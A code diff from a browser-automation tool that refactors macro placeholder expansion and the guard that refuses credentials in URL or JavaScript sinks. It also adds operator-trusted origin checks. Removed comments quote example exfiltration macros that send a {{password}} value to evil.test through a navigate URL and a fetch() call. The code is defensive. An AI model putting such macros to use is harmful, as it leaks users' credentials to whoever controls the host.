@@ -5,12 +5,19 @@
 
 from __future__ import annotations
 
-import copy
-import os
-import re
-from typing import Any
+from typing import TYPE_CHECKING, Any
+from urllib.parse import SplitResult, urlsplit
 
-from octowright.macros.privacy import is_credential_key
+# The sink set, the opt-out and the expander live in ``octowright.credential_sinks``
+# so the exported CLI runs the same rules; the first two are re-exported here.
+from octowright.credential_sinks import CREDENTIAL_UNSAFE_KEYS as CREDENTIAL_UNSAFE_KEYS
+from octowright.credential_sinks import Origin, dispatch_fields, expand_actions, url_origin
+from octowright.credential_sinks import credential_sinks_blocked as credential_sinks_blocked
+from octowright.defaults import new_tab_url
+from octowright.macros.privacy import PLACEHOLDER_RE, is_credential_key
+
+if TYPE_CHECKING:
+    from octowright.session._protocols import SessionLike
 
 SEMANTIC_LOCATOR_KEYS = (
     "role",
@@ -65,7 +72,8 @@ def substitute_in_action(action: dict[str, Any], value_to_name: dict[str, str]) 
 
 
 def action_kwargs(action: dict[str, Any]) -> dict[str, Any]:
-    return {key: value for key, value in action.items() if key not in RECORDING_NOISE_KEYS}
+    # The credential-fill guard's inputs go too: no session method takes them.
+    return {key: value for key, value in dispatch_fields(action).items() if key not in RECORDING_NOISE_KEYS}
 
 
 #: Actions whose locator IS the semantic keys, so stripping them would remove
@@ -85,19 +93,6 @@ def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
     return cleaned
 
 
-# Action fields that either leave the machine or execute code. A credential
-# expanded into one of these is exfiltration, not automation:
-# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
-# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
-#
-# The set is by FIELD NAME, so it has to grow whenever a new action introduces
-# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
-# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
-# ``locator.evaluate``/``target.evaluate``, so
-# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
-# was an unguarded ``evaluate`` under a different name.
-CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression", "verify_js", "grabbed_predicate_js"})
-
 #: Arg names whose value is treated as a secret. Deliberately name-based: the
 #: substituter sees opaque caller-supplied args and has no other signal, and
 #: matching on the name is what lets ``{{order_id}}`` keep working in a URL
@@ -111,50 +106,70 @@ CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression", "verify_js", "grabbed_p
 #: refused. The sink guard acts on the CREDENTIAL tier only, which is what
 #: keeps identity args working in a parameterized URL.
 
-_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})
-
-
-def credential_sinks_blocked() -> bool:
-    """Whether to refuse a credential-named arg in a navigation/code sink.
-
-    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
-    (or ``allow``) for a suite that intentionally puts a token in a URL --
-    an API-key query parameter is the legitimate case this would otherwise
-    break.
-    """
-    raw = os.environ.get("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "block").strip().lower()
-    return raw not in _CREDENTIAL_SINKS_OFF
-
 
 def is_credential_arg(name: str) -> bool:
     return is_credential_key(name)
 
 
-def _substitute_value(value: Any, args: dict[str, Any], *, unsafe_sink: bool = False) -> Any:
-    if isinstance(value, str):
+def _is_octowright_new_tab(parts: SplitResult) -> bool:
+    """Whether *parts* is the daemon's own new-tab page, on any loopback spelling."""
+    # Imported here: the exposure module brings the Starlette request stack,
+    # and the substituter is loaded by callers that never serve HTTP.
+    from octowright.http.exposure import is_loopback_host
 
-        def replacer(match: re.Match[str]) -> str:
-            key = match.group(1)
-            if key not in args:
-                raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(args)}")
-            if unsafe_sink and is_credential_arg(key) and credential_sinks_blocked():
-                raise ValueError(
-                    f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
-                    "this would send the secret off-machine. Set "
-                    "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
-                )
-            return str(args[key])
-
-        return re.sub(r"\{\{([^}]+)\}\}", replacer, value)
-    if isinstance(value, dict):
-        return {
-            key: _substitute_value(item, args, unsafe_sink=unsafe_sink or key in CREDENTIAL_UNSAFE_KEYS)
-            for key, item in value.items()
-        }
-    if isinstance(value, list):
-        return [_substitute_value(item, args, unsafe_sink=unsafe_sink) for item in value]
-    return value
+    own = urlsplit(new_tab_url())
+    try:
+        port = parts.port
+    except ValueError:
+        return False
+    return is_loopback_host(parts.hostname) and port == own.port and parts.path.rstrip("/") == own.path
 
 
-def substitute(actions: list[dict[str, Any]], args: dict[str, Any]) -> list[dict[str, Any]]:
-    return [_substitute_value(copy.deepcopy(action), args) for action in actions]
+def own_site_origins(session: SessionLike) -> set[Origin]:
+    """The origins the operator, not the macro, pointed this session at.
+
+    The launch URL and the persona ``base_url`` are chosen by whoever launched
+    the browser, and both are captured at launch and never written again.
+    ``session.url`` is NOT one of them: it follows every navigate, so reading
+    it let a poisoned macro navigate to its own server and then name it.
+
+    An origin, not a host: trusting ``localhost`` for a launch at
+    ``http://localhost:3000`` also trusted whatever listened on
+    ``localhost:45678``, and another local user can be that listener.
+
+    octowright's own new-tab page (a launch with no URL) is not an app, though a
+    local dev stack on ``localhost`` is. An ``OCTOWRIGHT_DEFAULT_URL`` naming
+    the operator's app is operator-chosen like any launch URL, so only the
+    daemon's page is excluded, not whatever the no-URL launch landed on.
+    """
+    origins: set[Origin] = set()
+    for url in (session.launch_url, session.base_url):
+        origin = url_origin(url)
+        if origin is not None and not _is_octowright_new_tab(urlsplit(str(url))):
+            origins.add(origin)
+    return origins
+
+
+def substitute(
+    actions: list[dict[str, Any]],
+    args: dict[str, Any],
+    *,
+    trusted_origins: frozenset[Origin] | set[Origin] = frozenset(),
+    credential_args: frozenset[str] = frozenset(),
+) -> list[dict[str, Any]]:
+    """Expand ``{{name}}`` placeholders, refusing a credential in a sink.
+
+    *trusted_origins* (``own_site_origins(session)``) is the one exemption: a
+    credential in the ``headers`` of an action whose pattern spells out one of
+    them. *credential_args* are credential-tier whatever they are named: the
+    args of a called macro that its caller's credential reached. The rules are
+    ``octowright.credential_sinks``'s, shared with the exported CLI.
+    """
+    return expand_actions(
+        actions,
+        args,
+        is_credential=is_credential_arg,
+        placeholder=PLACEHOLDER_RE,
+        trusted_origins=trusted_origins,
+        credential_args=credential_args,
+    )
